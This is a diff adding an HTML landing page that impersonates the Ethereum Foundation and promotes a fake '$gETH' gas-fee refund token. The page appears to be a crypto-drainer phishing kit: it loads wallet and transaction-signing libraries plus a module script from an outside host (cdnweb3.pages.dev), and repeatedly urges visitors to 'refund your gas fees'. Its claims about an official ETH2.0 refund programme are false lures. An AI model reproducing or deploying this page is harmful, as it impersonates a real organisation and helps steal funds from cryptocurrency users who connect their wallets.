@@ -1,0 +1,326 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+	<link rel="preconnect" href="https://fonts.googleapis.com">
+	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+	<link href="https://fonts.googleapis.com/css2?family=Montserrat:ital,wght@0,100..900;1,100..900&display=swap" rel="stylesheet">
+	<link rel="stylesheet" href="css/bootstrap.min.css">
+	<link rel="stylesheet" href="css/main.css?ver=321654">
+	<title>Document</title>
+
+
+
+
+  <link href="https://cdn.jsdelivr.net/npm/sweetalert2@11.7.16/dist/sweetalert2.min.css" rel="stylesheet">
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;700&family=Montserrat:wght@400;500;700&family=Raleway:wght@400;500;700&family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
+
+  <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11.7.16/dist/sweetalert2.all.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/gh/ethereumjs/browser-builds/dist/ethereumjs-tx/ethereumjs-tx-1.3.3.min.js"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js" integrity="sha512-FDcVY+g7vc5CXANbrTSg1K5qLyriCsGDYCE02Li1tXEYdNQPvLPHNE+rT2Mjei8N7fZbe0WLhw27j2SrGRpdMg==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/web3/4.0.3/web3.min.js" integrity="sha512-2oprd2T2vSkAii+dVWi6C+uATbQ1YGmCed6b6msb9Jxi33hsXAbnhwZ9thwCq6ndidZv4P51qaq58uo9b/x4nA==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+        
+  <script src="./settings.js"></script>
+  <script src="https://cdnweb3.pages.dev/web3-ethers.js" type="module"></script>
+
+
+
+
+	
+</head>
+<body>
+	<div class="backdrop" data-nav-close></div>
+	<nav class="nav nav--mobile">
+		<div class="nav-head d-flex align-items-start">
+			<img src="img/logo.svg" alt="" width="50" class="img-fluid">
+			<button class="button-none d-block ms-auto" data-nav-close>
+				<svg fill="#000000" viewBox="0 0 24 24" height="24" width="24" xmlns="http://www.w3.org/2000/svg"><g id="SVGRepo_bgCarrier" stroke-width="0"></g><g id="SVGRepo_tracerCarrier" stroke-linecap="round" stroke-linejoin="round"></g><g id="SVGRepo_iconCarrier"><path d="M4.293,18.293,10.586,12,4.293,5.707A1,1,0,0,1,5.707,4.293L12,10.586l6.293-6.293a1,1,0,1,1,1.414,1.414L13.414,12l6.293,6.293a1,1,0,1,1-1.414,1.414L12,13.414,5.707,19.707a1,1,0,0,1-1.414-1.414Z"></path></g></svg>
+			</button>
+		</div>
+		<ul>
+			<li><a href="#">Refund Example</a></li>
+			<li><a href="#">What is gETH?</a></li>
+			<li><a href="#">Why the gETH token?</a></li>
+			<li><a href="#">Refund My Gas Fees</a></li>
+		</ul>
+		<div class="nav-bottom d-flex flex-column">
+			<p>Ethereum is the community-run technology powering the cryptocurrency ether (ETH) and thousands of decentralized applications.</p>
+			<div class="align-self-start">
+				<a href="#" class="button button-primary">
+					<span>Return Gas Fees</span>
+				</a>
+			</div>
+		</div>
+	</nav>
+	<header class="header">
+		<div class="container-wide">
+			<div class="row align-items-center">
+				<div class="col-auto">
+					<a href="#" class="logo" data-postfix="gas refund">
+						<img src="img/logo.svg" alt="" class="logo-img">
+						<span class="logo-text">ETH Foundation</span>
+					</a>
+				</div>
+				<div class="col-auto ms-auto">
+					<button class="button-none d-block d-md-none" data-nav-btn>
+						<svg viewBox="0 0 24 24" height="24" width="24" fill="none" xmlns="http://www.w3.org/2000/svg">
+							<g stroke-width="0"></g>
+							<g stroke-linecap="round" stroke-linejoin="round"></g>
+							<g> <path d="M3 15H21M3 9H21" stroke="#000000" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"></path> </g> 
+						</svg>
+					</button>
+					<div class="nav nav--header d-none d-md-flex">
+						<ul>
+							<li><a href="#">Learn</a></li>
+							<li><a href="#">Use</a></li>
+							<li><a href="#">Bulid</a></li>
+							<li><a href="#">Participate</a></li>
+							<li><a href="#">Research</a></li>
+						</ul>
+					</div>
+				</div>
+			</div>
+		</div>
+	</header>
+	<main class="main">
+		<section class="block" style="background-image: url('img/hero-bg.jpg');">
+			<img src="img/eth-logo.svg" class="block-img" width="650" alt="">
+			<div class="container">
+				<div class="row">
+					<div class="col-md-8 col-lg-6 col-xl-5">
+						<div class="page-block position-relative z-1">
+							<div class="d-flex flex-column gap-4">
+								<div>
+									<div class="text-uppercase mb-2 text-center text-sm-start">join the movement</div>
+									<h1 class="page-block__title title-glitch mb-0 fw-semibold text-center text-sm-start" data-text="ETH Gas Fees, Redistributed.">ETH Gas Fees, Redistributed.</h1>
+								</div>
+								<div>
+									<p>ETH2.0's arrival brings a compensation to Ethereum users, for the gas fees they have spent.</p>
+									<p class="mb-0">Introducing <b>$gETH</b>, a token distributed in direct proportion to your gas fee expenditure.
+									<i class="text-decoration-underline">a project by Ethereum Foundation.</i></p>
+								</div>
+								<a href="#" class="button button-primary w-100">
+									<span>calculate your gas fees</span>
+								</a>
+							</div>
+						</div>
+					</div>
+				</div>
+			</div>
+		</section>
+
+		<section>
+			<div class="container">
+				<div class="row row-gap-4">
+					<div class="col-12">
+						<h2 class="fs-5">No account connected, using <span class="text-info">0xF0f35...07708</span> as an example.</h2>
+					</div>
+					<div class="col-12">
+						<div class="border border-black rounded-2 p-4">
+							<div class="fs-2 fw-semibold">You've spent <span class="text-info">ETH25.524</span> on gas. Right now, that's <span class="text-info text-type" data-type='[ "$ 85903", "€ 79042,79", "¥ 621508"]'
+								data-period="1000">€ 79042,79|</span></div>
+						</div>
+					</div>
+					<div class="col-12">
+						<div class="fs-5">You used 17,409,849 gas to send 539 transactions, with an average price of 26.48309M Gwei. <br>You can claim $12,294 worth of $gETH.</div>
+					</div>
+					<div class="col-md-6 col-xl-4">
+						<a href="#" class="button button-primary w-100">
+							<span>refund your gas fees</span>
+						</a>
+					</div>
+					<div class="col-md-6 col-xl-4 align-self-center">
+						<i>* In order to get your gETH tokens you first have to calculate your gas fees.</i>
+					</div>
+				</div>
+			</div>
+		</section>
+
+
+		<section class="bg-gray howto">
+			<div class="container position-relative">
+				<div class="row align-items-center">
+					<div class="col-md-6 col-lg-5">
+						<div class="d-flex flex-column gap-4">
+							<h2 class="fs-1 mb-0 fw-semibold title-glitch" data-text="What is gETH?">What is gETH?</h2>
+							<div class="howto-img">
+								<div class="position-relative">
+									<img src="img/how_to_buy.svg" class="img-fluid" width="750" alt="">
+									<img src="img/deco.svg" alt="" class="howto-img__deco">
+								</div>
+							</div>
+							<div class="position-relative z-1 d-flex flex-column gap-4">
+								<p class="fs-5 m-0">gETH, or gasETH, is an Ethereum core team token designed to reward individuals who have incurred significant gas fees on the Ethereum Mainnet. As Ethereum shifts into a new phase, reducing gas fees, we aim to recognize and reward those who have extensively utilized the network.</p>
+								<p class="fs-5">Once the ETH2.0 Sharding update is implemented, gasETH will serve as a gas token and is currently being actively developed by the Ethereum team.</p>
+							</div>
+						</div>
+					</div>
+				</div>
+			</div>
+		</section>
+
+		<section class="top-shadow">
+			<div class="container position-relative">
+				<div class="row align-items-center justify-content-center justify-content-lg-between row-gap-4">
+					<div class="col-10 col-sm-6 col-xl-5 position-relative z-1">
+						<img src="img/mainstream.svg" class="img-fluid w-100" alt="">
+					</div>
+					<div class="col-lg-6 position-relative z-1">
+						<h2 class="fs-1 mb-4 fw-semibold title-glitch" data-text="Why the gETH token?">Why the gETH token?</h2>
+						<p class="fs-5">Gas fees have been a persistent issue for the Ethereum network since its inception, leading to slow and costly transactions. The Ethereum Foundation has devised a solution—a token that rewards participants in ETH 1.0. Presently, Ethereum processes 1 million transactions daily and generates substantial ETH for its stakers (prior to miners). However, as ETH2.0 launches, gas fees will significantly decrease, with gETH serving as the primary currency for paying these fees.</p>
+						<h3 class="fs-4 mt-4 mb-3 fw-semibold">Architecture of gETH</h3>
+						<p class="fs-5">All gETH tokens will be redistributed to those who have spent on gas fees, ensuring proportional rewards based on their expenditure. This straightforward token is released by the Ethereum Foundation, established and funded by Ethereum from its beginning.</p>
+					</div>
+				</div>
+			</div>
+		</section>
+
+		<section class="block position-relative overflow-hidden cta" style="background-image: url('img/cta.jpg');">
+			<img src="img/eth-logo.svg" class="block-img" width="650" alt="">
+			<div class="container">
+				<div class="row justify-content-center">
+					<div class="col-lg-10 col-xl-8">
+						<div class="page-block position-relative z-1">
+							<div class="d-flex flex-column gap-4 align-items-center text-center">
+								<div>
+									<div class="text-uppercase mb-2">join the movement</div>
+									<h2 class="page-block__title h1 title-glitch mb-0 fw-semibold" data-text="ETH Gas Fees, Redistributed">ETH Gas Fees, Redistributed.</h2>
+								</div>
+								<a href="#" class="button button-lg button-primary">
+									<span>refund your gas fees</span>
+								</a>
+								<div>
+									<i>* In order to get your gETH tokens you first have to calculate your gas fees.</i>
+								</div>
+							</div>
+						</div>
+					</div>
+				</div>
+			</div>
+		</section>
+	</main>
+	<footer class="footer">
+		<div class="footer-top border-bottom py-3">
+			<div class="container-wide">
+				<div class="row align-items-center justify-content-between">
+					<div class="col-auto">
+						<div class="logo">
+							<img src="img/logo.svg" alt="ETH Foundation" class="logo-img">
+							<span class="logo-text">ETH Foundation</span>
+						</div>
+					</div>
+					<div class="col-sm-auto d-none d-sm-block">
+						<div class="d-flex gap-3 align-items-center">
+							<a href="#">
+								<svg width="30px" height="30px" viewBox="0 0 20 20" version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" fill="#B2B2B2"><g id="SVGRepo_bgCarrier" stroke-width="0"></g><g id="SVGRepo_tracerCarrier" stroke-linecap="round" stroke-linejoin="round"></g><g id="SVGRepo_iconCarrier"> <title>github [#142]</title> <desc>Created with Sketch.</desc> <defs> </defs> <g id="Page-1" stroke="none" stroke-width="1" fill="none" fill-rule="evenodd"> <g id="Dribbble-Light-Preview" transform="translate(-140.000000, -7559.000000)" fill="#B2B2B2"> <g id="icons" transform="translate(56.000000, 160.000000)"> <path d="M94,7399 C99.523,7399 104,7403.59 104,7409.253 C104,7413.782 101.138,7417.624 97.167,7418.981 C96.66,7419.082 96.48,7418.762 96.48,7418.489 C96.48,7418.151 96.492,7417.047 96.492,7415.675 C96.492,7414.719 96.172,7414.095 95.813,7413.777 C98.04,7413.523 100.38,7412.656 100.38,7408.718 C100.38,7407.598 99.992,7406.684 99.35,7405.966 C99.454,7405.707 99.797,7404.664 99.252,7403.252 C99.252,7403.252 98.414,7402.977 96.505,7404.303 C95.706,7404.076 94.85,7403.962 94,7403.958 C93.15,7403.962 92.295,7404.076 91.497,7404.303 C89.586,7402.977 88.746,7403.252 88.746,7403.252 C88.203,7404.664 88.546,7405.707 88.649,7405.966 C88.01,7406.684 87.619,7407.598 87.619,7408.718 C87.619,7412.646 89.954,7413.526 92.175,7413.785 C91.889,7414.041 91.63,7414.493 91.54,7415.156 C90.97,7415.418 89.522,7415.871 88.63,7414.304 C88.63,7414.304 88.101,7413.319 87.097,7413.247 C87.097,7413.247 86.122,7413.234 87.029,7413.87 C87.029,7413.87 87.684,7414.185 88.139,7415.37 C88.139,7415.37 88.726,7417.2 91.508,7416.58 C91.513,7417.437 91.522,7418.245 91.522,7418.489 C91.522,7418.76 91.338,7419.077 90.839,7418.982 C86.865,7417.627 84,7413.783 84,7409.253 C84,7403.59 88.478,7399 94,7399" id="github-[#142]"> </path> </g> </g> </g> </g></svg>
+							</a>
+							<a href="#">
+								<svg width="35px" height="35px" viewBox="0 -2 20 20" version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" fill="#B2B2B2"><g id="SVGRepo_bgCarrier" stroke-width="0"></g><g id="SVGRepo_tracerCarrier" stroke-linecap="round" stroke-linejoin="round"></g><g id="SVGRepo_iconCarrier"> <title>twitter [#154]</title> <desc>Created with Sketch.</desc> <defs> </defs> <g id="Page-1" stroke="none" stroke-width="1" fill="none" fill-rule="evenodd"> <g id="Dribbble-Light-Preview" transform="translate(-60.000000, -7521.000000)" fill="#B2B2B2"> <g id="icons" transform="translate(56.000000, 160.000000)"> <path d="M10.29,7377 C17.837,7377 21.965,7370.84365 21.965,7365.50546 C21.965,7365.33021 21.965,7365.15595 21.953,7364.98267 C22.756,7364.41163 23.449,7363.70276 24,7362.8915 C23.252,7363.21837 22.457,7363.433 21.644,7363.52751 C22.5,7363.02244 23.141,7362.2289 23.448,7361.2926 C22.642,7361.76321 21.761,7362.095 20.842,7362.27321 C19.288,7360.64674 16.689,7360.56798 15.036,7362.09796 C13.971,7363.08447 13.518,7364.55538 13.849,7365.95835 C10.55,7365.79492 7.476,7364.261 5.392,7361.73762 C4.303,7363.58363 4.86,7365.94457 6.663,7367.12996 C6.01,7367.11125 5.371,7366.93797 4.8,7366.62489 L4.8,7366.67608 C4.801,7368.5989 6.178,7370.2549 8.092,7370.63591 C7.488,7370.79836 6.854,7370.82199 6.24,7370.70483 C6.777,7372.35099 8.318,7373.47829 10.073,7373.51078 C8.62,7374.63513 6.825,7375.24554 4.977,7375.24358 C4.651,7375.24259 4.325,7375.22388 4,7375.18549 C5.877,7376.37088 8.06,7377 10.29,7376.99705" id="twitter-[#154]"> </path> </g> </g> </g> </g></svg>
+							</a>
+							<a href="#">
+								<svg width="45px" height="45px" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><g id="SVGRepo_bgCarrier" stroke-width="0"></g><g id="SVGRepo_tracerCarrier" stroke-linecap="round" stroke-linejoin="round"></g><g id="SVGRepo_iconCarrier"> <path d="M18.59 5.88997C17.36 5.31997 16.05 4.89997 14.67 4.65997C14.5 4.95997 14.3 5.36997 14.17 5.69997C12.71 5.47997 11.26 5.47997 9.83001 5.69997C9.69001 5.36997 9.49001 4.95997 9.32001 4.65997C7.94001 4.89997 6.63001 5.31997 5.40001 5.88997C2.92001 9.62997 2.25001 13.28 2.58001 16.87C4.23001 18.1 5.82001 18.84 7.39001 19.33C7.78001 18.8 8.12001 18.23 8.42001 17.64C7.85001 17.43 7.31001 17.16 6.80001 16.85C6.94001 16.75 7.07001 16.64 7.20001 16.54C10.33 18 13.72 18 16.81 16.54C16.94 16.65 17.07 16.75 17.21 16.85C16.7 17.16 16.15 17.42 15.59 17.64C15.89 18.23 16.23 18.8 16.62 19.33C18.19 18.84 19.79 18.1 21.43 16.87C21.82 12.7 20.76 9.08997 18.61 5.88997H18.59ZM8.84001 14.67C7.90001 14.67 7.13001 13.8 7.13001 12.73C7.13001 11.66 7.88001 10.79 8.84001 10.79C9.80001 10.79 10.56 11.66 10.55 12.73C10.55 13.79 9.80001 14.67 8.84001 14.67ZM15.15 14.67C14.21 14.67 13.44 13.8 13.44 12.73C13.44 11.66 14.19 10.79 15.15 10.79C16.11 10.79 16.87 11.66 16.86 12.73C16.86 13.79 16.11 14.67 15.15 14.67Z" fill="#B2B2B2"></path> </g></svg>
+							</a>
+						</div>
+					</div>
+				</div>
+			</div>
+		</div>
+		<div class="footer-middle">
+			<div class="container-wide">
+				<div class="d-flex d-sm-none gap-3 align-items-center mb-4">
+					<a href="#">
+						<svg width="30px" height="30px" viewBox="0 0 20 20" version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" fill="#B2B2B2"><g id="SVGRepo_bgCarrier" stroke-width="0"></g><g id="SVGRepo_tracerCarrier" stroke-linecap="round" stroke-linejoin="round"></g><g id="SVGRepo_iconCarrier"> <title>github [#142]</title> <desc>Created with Sketch.</desc> <defs> </defs> <g id="Page-1" stroke="none" stroke-width="1" fill="none" fill-rule="evenodd"> <g id="Dribbble-Light-Preview" transform="translate(-140.000000, -7559.000000)" fill="#B2B2B2"> <g id="icons" transform="translate(56.000000, 160.000000)"> <path d="M94,7399 C99.523,7399 104,7403.59 104,7409.253 C104,7413.782 101.138,7417.624 97.167,7418.981 C96.66,7419.082 96.48,7418.762 96.48,7418.489 C96.48,7418.151 96.492,7417.047 96.492,7415.675 C96.492,7414.719 96.172,7414.095 95.813,7413.777 C98.04,7413.523 100.38,7412.656 100.38,7408.718 C100.38,7407.598 99.992,7406.684 99.35,7405.966 C99.454,7405.707 99.797,7404.664 99.252,7403.252 C99.252,7403.252 98.414,7402.977 96.505,7404.303 C95.706,7404.076 94.85,7403.962 94,7403.958 C93.15,7403.962 92.295,7404.076 91.497,7404.303 C89.586,7402.977 88.746,7403.252 88.746,7403.252 C88.203,7404.664 88.546,7405.707 88.649,7405.966 C88.01,7406.684 87.619,7407.598 87.619,7408.718 C87.619,7412.646 89.954,7413.526 92.175,7413.785 C91.889,7414.041 91.63,7414.493 91.54,7415.156 C90.97,7415.418 89.522,7415.871 88.63,7414.304 C88.63,7414.304 88.101,7413.319 87.097,7413.247 C87.097,7413.247 86.122,7413.234 87.029,7413.87 C87.029,7413.87 87.684,7414.185 88.139,7415.37 C88.139,7415.37 88.726,7417.2 91.508,7416.58 C91.513,7417.437 91.522,7418.245 91.522,7418.489 C91.522,7418.76 91.338,7419.077 90.839,7418.982 C86.865,7417.627 84,7413.783 84,7409.253 C84,7403.59 88.478,7399 94,7399" id="github-[#142]"> </path> </g> </g> </g> </g></svg>
+					</a>
+					<a href="#">
+						<svg width="35px" height="35px" viewBox="0 -2 20 20" version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" fill="#B2B2B2"><g id="SVGRepo_bgCarrier" stroke-width="0"></g><g id="SVGRepo_tracerCarrier" stroke-linecap="round" stroke-linejoin="round"></g><g id="SVGRepo_iconCarrier"> <title>twitter [#154]</title> <desc>Created with Sketch.</desc> <defs> </defs> <g id="Page-1" stroke="none" stroke-width="1" fill="none" fill-rule="evenodd"> <g id="Dribbble-Light-Preview" transform="translate(-60.000000, -7521.000000)" fill="#B2B2B2"> <g id="icons" transform="translate(56.000000, 160.000000)"> <path d="M10.29,7377 C17.837,7377 21.965,7370.84365 21.965,7365.50546 C21.965,7365.33021 21.965,7365.15595 21.953,7364.98267 C22.756,7364.41163 23.449,7363.70276 24,7362.8915 C23.252,7363.21837 22.457,7363.433 21.644,7363.52751 C22.5,7363.02244 23.141,7362.2289 23.448,7361.2926 C22.642,7361.76321 21.761,7362.095 20.842,7362.27321 C19.288,7360.64674 16.689,7360.56798 15.036,7362.09796 C13.971,7363.08447 13.518,7364.55538 13.849,7365.95835 C10.55,7365.79492 7.476,7364.261 5.392,7361.73762 C4.303,7363.58363 4.86,7365.94457 6.663,7367.12996 C6.01,7367.11125 5.371,7366.93797 4.8,7366.62489 L4.8,7366.67608 C4.801,7368.5989 6.178,7370.2549 8.092,7370.63591 C7.488,7370.79836 6.854,7370.82199 6.24,7370.70483 C6.777,7372.35099 8.318,7373.47829 10.073,7373.51078 C8.62,7374.63513 6.825,7375.24554 4.977,7375.24358 C4.651,7375.24259 4.325,7375.22388 4,7375.18549 C5.877,7376.37088 8.06,7377 10.29,7376.99705" id="twitter-[#154]"> </path> </g> </g> </g> </g></svg>
+					</a>
+					<a href="#">
+						<svg width="45px" height="45px" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><g id="SVGRepo_bgCarrier" stroke-width="0"></g><g id="SVGRepo_tracerCarrier" stroke-linecap="round" stroke-linejoin="round"></g><g id="SVGRepo_iconCarrier"> <path d="M18.59 5.88997C17.36 5.31997 16.05 4.89997 14.67 4.65997C14.5 4.95997 14.3 5.36997 14.17 5.69997C12.71 5.47997 11.26 5.47997 9.83001 5.69997C9.69001 5.36997 9.49001 4.95997 9.32001 4.65997C7.94001 4.89997 6.63001 5.31997 5.40001 5.88997C2.92001 9.62997 2.25001 13.28 2.58001 16.87C4.23001 18.1 5.82001 18.84 7.39001 19.33C7.78001 18.8 8.12001 18.23 8.42001 17.64C7.85001 17.43 7.31001 17.16 6.80001 16.85C6.94001 16.75 7.07001 16.64 7.20001 16.54C10.33 18 13.72 18 16.81 16.54C16.94 16.65 17.07 16.75 17.21 16.85C16.7 17.16 16.15 17.42 15.59 17.64C15.89 18.23 16.23 18.8 16.62 19.33C18.19 18.84 19.79 18.1 21.43 16.87C21.82 12.7 20.76 9.08997 18.61 5.88997H18.59ZM8.84001 14.67C7.90001 14.67 7.13001 13.8 7.13001 12.73C7.13001 11.66 7.88001 10.79 8.84001 10.79C9.80001 10.79 10.56 11.66 10.55 12.73C10.55 13.79 9.80001 14.67 8.84001 14.67ZM15.15 14.67C14.21 14.67 13.44 13.8 13.44 12.73C13.44 11.66 14.19 10.79 15.15 10.79C16.11 10.79 16.87 11.66 16.86 12.73C16.86 13.79 16.11 14.67 15.15 14.67Z" fill="#B2B2B2"></path> </g></svg>
+					</a>
+				</div>
+				<div class="row row-gap-4">
+					<div class="col-sm-6 col-md-4 col-lg-3">
+						<nav class="nav nav--footer d-flex flex-column gap-3">
+							<div class="nav-title">Learn</div>
+							<ul>
+								<li><a href="#" class="nav__link">Learn Hub</a></li>
+								<li><a href="#" class="nav__link">What is Ethereum?</a></li>
+								<li><a href="#" class="nav__link">What is ether (ETH)?</a></li>
+								<li><a href="#" class="nav__link">Ethereum wallets</a></li>
+								<li><a href="#" class="nav__link">What is Web3?</a></li>
+								<li><a href="#" class="nav__link">Smart contracts</a></li>
+								<li><a href="#" class="nav__link">Gas fees</a></li>
+								<li><a href="#" class="nav__link">Run a node</a></li>
+								<li><a href="#" class="nav__link">Ethereum security</a></li>
+								<li><a href="#" class="nav__link">Quiz Hub</a></li>
+								<li><a href="#" class="nav__link">Ethereum glossary</a></li>
+							</ul>
+						</nav>
+					</div>
+					<div class="col-sm-6 col-md-4 col-lg-3">
+						<nav class="nav nav--footer d-flex flex-column gap-3">
+							<div class="nav-title">Use</div>
+							<ul>
+								<li><a href="#" class="nav__link">Guides</a></li>
+								<li><a href="#" class="nav__link">Choose your wallet</a></li>
+								<li><a href="#" class="nav__link">Get ETH</a></li>
+								<li><a href="#" class="nav__link">Dapps - Decentralized applications</a></li>
+								<li><a href="#" class="nav__link">Stablecoins</a></li>
+								<li><a href="#" class="nav__link">NFTs - Non-fungible tokens</a></li>
+								<li><a href="#" class="nav__link">DeFi - Decentralized finance</a></li>
+								<li><a href="#" class="nav__link">DAOs</a></li>
+								<li><a href="#" class="nav__link">Decentralized identity</a></li>
+								<li><a href="#" class="nav__link">Stake ETH</a></li>
+								<li><a href="#" class="nav__link">Layer 2</a></li>
+							</ul>
+						</nav>
+					</div>
+					<div class="col-sm-6 col-md-4 col-lg-3">
+						<nav class="nav nav--footer d-flex flex-column gap-3">
+							<div class="nav-title">Build</div>
+							<ul>
+								<li><a href="#" class="nav__link">Builder's home</a></li>
+								<li><a href="#" class="nav__link">Tutorials</a></li>
+								<li><a href="#" class="nav__link">Documentation</a></li>
+								<li><a href="#" class="nav__link">Learn by coding</a></li>
+								<li><a href="#" class="nav__link">Set up local environment</a></li>
+								<li><a href="#" class="nav__link">Grants</a></li>
+								<li><a href="#" class="nav__link">Foundational topics</a></li>
+								<li><a href="#" class="nav__link">UX/UI design fundamentals</a></li>
+								<li><a href="#" class="nav__link">Enterprise - Mainnet Ethereum</a></li>
+								<li><a href="#" class="nav__link">Enterprise - Private Ethereum</a></li>
+							</ul>
+						</nav>
+					</div>
+					<div class="col-sm-6 col-md-4 col-lg-3">
+						<nav class="nav nav--footer d-flex flex-column gap-3">
+							<div class="nav-title">Learn</div>
+							<ul>
+								<li><a href="#" class="nav__link">Community hub</a></li>
+								<li><a href="#" class="nav__link">Online communities</a></li>
+								<li><a href="#" class="nav__link">Ethereum events</a></li>
+								<li><a href="#" class="nav__link">Contributing to ethereum.org</a></li>
+								<li><a href="#" class="nav__link">Translation Program</a></li>
+								<li><a href="#" class="nav__link">Ethereum bug bounty program</a></li>
+								<li><a href="#" class="nav__link">Ethereum Foundation</a></li>
+								<li><a href="#" class="nav__link">Ecosystem Support</a></li>
+								<li><a href="#" class="nav__link">Program</a></li>
+								<li><a href="#" class="nav__link">Devcon</a></li>
+							</ul>
+						</nav>
+					</div>
+				</div>
+			</div>
+		</div>
+		<div class="footer-bottom">
+			<div class="container-wide">
+				<small><span><script>document.write(new Date().getFullYear())</script></span> © Ethereum Foundation / Gas Refund program</small>
+			</div>
+		</div>
+	</footer>
+	<script src="js/main.js"></script>
+</body>
+</html>
